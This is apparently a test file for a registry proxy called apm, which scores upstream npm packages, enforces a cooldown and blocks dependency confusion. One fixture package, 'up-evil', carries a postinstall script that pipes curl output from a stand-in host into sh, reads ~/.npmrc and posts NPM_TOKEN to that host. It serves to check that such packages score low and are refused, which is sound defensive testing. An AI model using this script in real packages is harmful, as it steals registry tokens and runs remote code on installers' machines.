// Spec (council round 1): apm proxies the public registry, so the score, the ~safe view, the
// install gate and audit cover the packages people actually install, not only ones published to apm.
// A second in-process registry stands in for registry.npmjs.org.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, run, apm, getJson, installedVersion, dig, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
const HOUR = 60 * 60 * 1000;
let clock = Date.parse("2026-07-01T00:00:00Z");
let upstream: Registry;
let reg: Registry;
let upAlice: string;
let alice: string;
let work: string;

async function publishUpstream(name: string, version: string, extra: Partial<Parameters<typeof writePackage>[1]> = {}): Promise<void> {
  const sb = makeSandbox(upstream, upAlice);
  const d = writePackage(work, { name, version, ...extra }, upstream, upAlice);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });
  if (r.code !== 0) throw new Error(`upstream publish ${name}@${version} failed: ${r.out}`);
}

beforeAll(async () => {
  upstream = await startRegistry({ now: () => clock });
  upAlice = await addUser(upstream, "upalice", "correct-horse-battery");
  work = mkdtempSync(join(tmpdir(), "apm-up-"));
  await publishUpstream("up-pkg", "1.0.0");
  await publishUpstream("up-head", "1.0.0");
  clock += 10 * DAY;
  await publishUpstream("up-evil", "1.0.0", {
    scripts: { postinstall: "node i.js" },
    files: { "index.js": "module.exports=1;\n", "i.js": "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n" },
  });
  await publishUpstream("up-pkg", "1.1.0");
  clock += 10 * DAY;
  await publishUpstream("up-pkg", "1.2.0"); // brand new
  clock += 2 * HOUR;
  reg = await startRegistry({ now: () => clock, upstream: upstream.url });
  alice = await addUser(reg, "alice", "correct-horse-battery");
});
afterAll(async () => {
  await reg?.stop();
  await upstream?.stop();
});

describe("upstream proxy", () => {
  test("HEAD of a package answer says whether it exists without building the answer or analysing a version", async () => {
    const analyses = async (): Promise<number> =>
      (await reg.query("SELECT 1 FROM upstream_analysis WHERE package = $1 UNION ALL SELECT 1 FROM analysis_jobs WHERE package = $1", ["up-head"])).length;

    const head = await fetch(`${reg.url}-/apm/v1/packages/up-head`, { method: "HEAD" });

    expect(head.status).toBe(200);
    expect(await head.text()).toBe("");
    expect(await analyses()).toBe(0);
    expect((await fetch(`${reg.url}-/apm/v1/packages/no-such-package-anywhere`, { method: "HEAD" })).status).toBe(404);
    // the full answer analyses the latest version, which is what the HEAD spares the website's proxy
    expect((await getJson(`${reg.url}-/apm/v1/packages/up-head`)).status).toBe(200);
    expect(await analyses()).toBeGreaterThan(0);
  });

  test("packages that only exist upstream are served, with tarball URLs on apm", async () => {
    const { status, body } = await getJson(`${reg.url}up-pkg`);
    expect(status).toBe(200);
    expect(dig(body, "dist-tags", "latest")).toBe("1.2.0");
    expect(String(dig(body, "versions", "1.1.0", "dist", "tarball"))).toStartWith(reg.url);
  });

  test("stock bun and npm install upstream packages through apm", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, { "up-pkg": "~1.1.0" });
    const r = await run(["bun", "install"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "up-pkg")).toBe("1.1.0");
    const app2 = writeConsumer(work, reg, alice, { "up-pkg": "~1.1.0" });
    const r2 = await run(["npm", "install"], { cwd: app2, env: sb.env });
    expect(r2.code, r2.out).toBe(0);
    expect(installedVersion(app2, "up-pkg")).toBe("1.1.0");
  });

  test("upstream versions get scored on demand", async () => {
    const good = await getJson(`${reg.url}-/apm/v1/score/up-pkg/1.1.0`);
    expect(good.status, JSON.stringify(good.body)).toBe(200);
    expect(Number(dig(good.body, "score"))).toBeGreaterThanOrEqual(85);
    const bad = await getJson(`${reg.url}-/apm/v1/score/up-evil/1.0.0`);
    expect(bad.status).toBe(200);
    expect(Number(dig(bad.body, "score"))).toBeLessThan(40);
  });

  test("the ~safe view applies the cooldown to upstream packages", async () => {
    const { body } = await getJson(`${reg.url}~safe/up-pkg`);
    expect(dig(body, "versions", "1.2.0")).toBeUndefined();
    expect(dig(body, "dist-tags", "latest")).toBe("1.1.0");
  });

  test("a name that exists upstream cannot be published on apm (no dependency confusion)", async () => {
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "up-pkg", version: "9.0.0" }, reg, alice);
    const r = await run(["npm", "publish"], { cwd: d, env: sb.env });
    expect(r.code).not.toBe(0);
    const { body } = await getJson(`${reg.url}up-pkg`);
    expect(dig(body, "versions", "9.0.0")).toBeUndefined();
  });

  test("apm add gates upstream packages by score and cooldown", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, {});
    const ok = await apm(["add", "up-pkg"], { cwd: app, env: sb.env });
    expect(ok.code, ok.out).toBe(0);
    expect(installedVersion(app, "up-pkg")).toBe("1.1.0");
    const bad = await apm(["add", "up-evil"], { cwd: app, env: sb.env });
    expect(bad.code).not.toBe(0);
    expect(installedVersion(app, "up-evil")).toBeNull();
  });

  test("audit through apm includes upstream advisories", async () => {
    const rv = await getJson(`${upstream.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${upAlice}` },
      body: JSON.stringify({ name: "up-pkg", version: "1.2.0", reason: "upstream says compromised", password: "correct-horse-battery" }),
    });
    expect(rv.status, JSON.stringify(rv.body)).toBe(200);
    const r = await getJson(`${reg.url}-/npm/v1/security/advisories/bulk`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ "up-pkg": ["1.2.0"] }),
    });
    expect(r.status).toBe(200);
    expect(JSON.stringify(r.body)).toContain("upstream says compromised");
  });
});
